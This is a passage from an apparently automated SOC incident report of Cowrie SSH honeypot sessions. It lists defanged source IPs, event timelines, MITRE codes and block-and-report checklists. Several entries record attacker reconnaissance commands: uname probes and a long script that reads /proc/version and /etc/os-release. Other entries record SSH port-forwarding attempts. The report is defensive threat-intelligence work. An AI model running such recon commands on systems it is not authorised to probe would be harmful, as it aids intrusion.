| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:22:34` | `cowrie.session.connect` |
| `2026-07-14 20:22:35` | `cowrie.client.version` |
| `2026-07-14 20:22:35` | `cowrie.client.kex` |
| `2026-07-14 20:22:37` | `cowrie.login.success` |
| `2026-07-14 20:22:38` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2126034b7c7

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-07-14 20:23 |
| **Last Seen** | 2026-07-14 20:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:23:45` | `cowrie.session.connect` |
| `2026-07-14 20:23:46` | `cowrie.client.version` |
| `2026-07-14 20:23:46` | `cowrie.client.kex` |
| `2026-07-14 20:23:47` | `cowrie.login.success` |
| `2026-07-14 20:23:48` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ce1eeefc1a

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-07-14 20:23 |
| **Last Seen** | 2026-07-14 20:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:23:54` | `cowrie.session.connect` |
| `2026-07-14 20:23:54` | `cowrie.client.version` |
| `2026-07-14 20:23:54` | `cowrie.client.kex` |
| `2026-07-14 20:23:56` | `cowrie.login.success` |
| `2026-07-14 20:23:57` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca520817207

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-07-14 20:25 |
| **Last Seen** | 2026-07-14 20:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:25:36` | `cowrie.session.connect` |
| `2026-07-14 20:25:37` | `cowrie.client.version` |
| `2026-07-14 20:25:37` | `cowrie.client.kex` |
| `2026-07-14 20:25:39` | `cowrie.login.success` |
| `2026-07-14 20:25:39` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40032ca87609

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 20:25 |
| **Last Seen** | 2026-07-14 20:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:25:53` | `cowrie.session.connect` |
| `2026-07-14 20:25:53` | `cowrie.client.version` |
| `2026-07-14 20:25:53` | `cowrie.client.kex` |
| `2026-07-14 20:25:55` | `cowrie.login.success` |
| `2026-07-14 20:25:57` | `cowrie.session.params` |
| `2026-07-14 20:25:57` | `cowrie.command.input` |
| `2026-07-14 20:25:57` | `cowrie.log.closed` |
| `2026-07-14 20:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6acbaebceffe

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-14 20:31 |
| **Last Seen** | 2026-07-14 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:31:25` | `cowrie.session.connect` |
| `2026-07-14 20:31:25` | `cowrie.client.version` |
| `2026-07-14 20:31:25` | `cowrie.client.kex` |
| `2026-07-14 20:31:26` | `cowrie.login.success` |
| `2026-07-14 20:31:27` | `cowrie.session.params` |
| `2026-07-14 20:31:27` | `cowrie.command.input` |
| `2026-07-14 20:31:27` | `cowrie.log.closed` |
| `2026-07-14 20:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f78de7413554

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:33 |
| **Last Seen** | 2026-07-14 20:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:33:16` | `cowrie.session.connect` |
| `2026-07-14 20:33:17` | `cowrie.client.version` |
| `2026-07-14 20:33:17` | `cowrie.client.kex` |
| `2026-07-14 20:33:19` | `cowrie.login.success` |
| `2026-07-14 20:33:20` | `cowrie.session.params` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.success` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:20` | `cowrie.command.input` |
| `2026-07-14 20:33:21` | `cowrie.log.closed` |
| `2026-07-14 20:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef61ad659fc9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:34 |
| **Last Seen** | 2026-07-14 20:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:34:54` | `cowrie.session.connect` |
| `2026-07-14 20:34:54` | `cowrie.client.version` |
| `2026-07-14 20:34:54` | `cowrie.client.kex` |
| `2026-07-14 20:34:56` | `cowrie.login.success` |
| `2026-07-14 20:34:57` | `cowrie.session.params` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.success` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:57` | `cowrie.command.input` |
| `2026-07-14 20:34:58` | `cowrie.log.closed` |
| `2026-07-14 20:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec03ba170cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:36 |
| **Last Seen** | 2026-07-14 20:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:36:30` | `cowrie.session.connect` |
| `2026-07-14 20:36:30` | `cowrie.client.version` |
| `2026-07-14 20:36:30` | `cowrie.client.kex` |
| `2026-07-14 20:36:32` | `cowrie.login.success` |
| `2026-07-14 20:36:33` | `cowrie.session.params` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.success` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:33` | `cowrie.command.input` |
| `2026-07-14 20:36:34` | `cowrie.log.closed` |
| `2026-07-14 20:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa89a6a4b8c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:38 |
| **Last Seen** | 2026-07-14 20:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:38:07` | `cowrie.session.connect` |
| `2026-07-14 20:38:07` | `cowrie.client.version` |
| `2026-07-14 20:38:07` | `cowrie.client.kex` |
| `2026-07-14 20:38:09` | `cowrie.login.success` |
| `2026-07-14 20:38:11` | `cowrie.session.params` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.success` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.command.input` |
| `2026-07-14 20:38:11` | `cowrie.log.closed` |
| `2026-07-14 20:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33953a7de09b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:39 |
| **Last Seen** | 2026-07-14 20:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:39:40` | `cowrie.session.connect` |
| `2026-07-14 20:39:40` | `cowrie.client.version` |
| `2026-07-14 20:39:40` | `cowrie.client.kex` |
| `2026-07-14 20:39:42` | `cowrie.login.success` |
| `2026-07-14 20:39:43` | `cowrie.session.params` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.success` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.command.input` |
| `2026-07-14 20:39:43` | `cowrie.log.closed` |
| `2026-07-14 20:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2e01b61d05

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:41 |
| **Last Seen** | 2026-07-14 20:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:41:12` | `cowrie.session.connect` |
| `2026-07-14 20:41:12` | `cowrie.client.version` |
| `2026-07-14 20:41:12` | `cowrie.client.kex` |
| `2026-07-14 20:41:14` | `cowrie.login.success` |
| `2026-07-14 20:41:16` | `cowrie.session.params` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.success` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.command.input` |
| `2026-07-14 20:41:16` | `cowrie.log.closed` |
| `2026-07-14 20:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec8bb1d17f9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:42 |
| **Last Seen** | 2026-07-14 20:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:42:44` | `cowrie.session.connect` |
| `2026-07-14 20:42:44` | `cowrie.client.version` |
| `2026-07-14 20:42:44` | `cowrie.client.kex` |
| `2026-07-14 20:42:45` | `cowrie.login.success` |
| `2026-07-14 20:42:46` | `cowrie.session.params` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.success` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:46` | `cowrie.command.input` |
| `2026-07-14 20:42:47` | `cowrie.log.closed` |
| `2026-07-14 20:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7e46007437

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 20:42 |
| **Last Seen** | 2026-07-14 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:42:57` | `cowrie.session.connect` |
| `2026-07-14 20:42:57` | `cowrie.client.version` |
| `2026-07-14 20:42:57` | `cowrie.client.kex` |
| `2026-07-14 20:42:58` | `cowrie.login.success` |
| `2026-07-14 20:42:58` | `cowrie.session.params` |
| `2026-07-14 20:42:58` | `cowrie.command.input` |
| `2026-07-14 20:42:58` | `cowrie.log.closed` |
| `2026-07-14 20:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcbb502b4ff9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:44 |
| **Last Seen** | 2026-07-14 20:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:44:19` | `cowrie.session.connect` |
| `2026-07-14 20:44:19` | `cowrie.client.version` |
| `2026-07-14 20:44:19` | `cowrie.client.kex` |
| `2026-07-14 20:44:20` | `cowrie.login.success` |
| `2026-07-14 20:44:21` | `cowrie.session.params` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.success` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.command.input` |
| `2026-07-14 20:44:21` | `cowrie.log.closed` |
| `2026-07-14 20:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1ea07062a75

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-14 20:45 |
| **Last Seen** | 2026-07-14 20:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:45:54` | `cowrie.session.connect` |
| `2026-07-14 20:45:54` | `cowrie.client.version` |
| `2026-07-14 20:45:54` | `cowrie.client.kex` |
| `2026-07-14 20:45:56` | `cowrie.login.success` |
| `2026-07-14 20:45:58` | `cowrie.session.params` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.success` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.command.input` |
| `2026-07-14 20:45:58` | `cowrie.log.closed` |
| `2026-07-14 20:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
